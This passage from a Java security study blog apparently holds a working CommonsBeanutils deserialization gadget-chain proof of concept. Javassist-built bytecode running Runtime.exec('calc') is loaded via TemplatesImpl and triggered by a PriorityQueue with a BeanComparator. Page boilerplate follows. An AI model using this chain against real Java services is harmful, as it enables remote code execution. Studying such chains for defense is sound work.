class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException </span>&#123;<br>        Random random = <span class="hljs-keyword">new</span> Random();<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        String suffix = RandomStringUtils.randomAlphabetic(<span class="hljs-number">5</span>);<br>        suffix = Character.toUpperCase(suffix.charAt(<span class="hljs-number">0</span>)) + suffix.substring(<span class="hljs-number">1</span>).toLowerCase();<br>        Long timestamp = System.currentTimeMillis();<br>        String prefix = Long.toString(timestamp);<br>        CtClass ctClass = cp.makeClass(random.nextInt() + prefix.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>) + suffix);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><span class="hljs-comment">//        BeanComparator comparator = new BeanComparator();</span><br><span class="hljs-comment">//        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array = &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, queue_array);<br>        setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>SLF4J</strong></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/language/">language</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    Êú¨ÂçöÂÆ¢ÊâÄÊúâÊñáÁ´†Èô§ÁâπÂà´Â£∞ÊòéÂ§ñÔºåÂùáÈááÁî® <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 ÂçèËÆÆ</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§ÑÔºÅ
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/03/15/JNDI&amp;RMI&amp;LDAP/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">JNDI&RMI&LDAP</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/03/15/Unsafe/">
                        <span class="hidden-mobile"></span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"ËØ¥ÁÇπ‰ªÄ‰πà","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">ËΩΩÂÖ•Â§©Êï∞...</span> <span id="times">ËΩΩÂÖ•Êó∂ÂàÜÁßí...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ‰∏çËíúÂ≠êÁªüËÆ°PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            ÊÄªËÆøÈóÆÈáè 
            <span id="busuanzi_value_site_pv"></span>
             Ê¨°
          </span>
      
      
        <!-- ‰∏çËíúÂ≠êÁªüËÆ°UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            ÊÄªËÆøÂÆ¢Êï∞ 
            <span id="busuanzi_value_site_uv"></span>
             ‰∫∫
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°π ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<script  src="/js/boot.js" ></script>


</body>
</html>
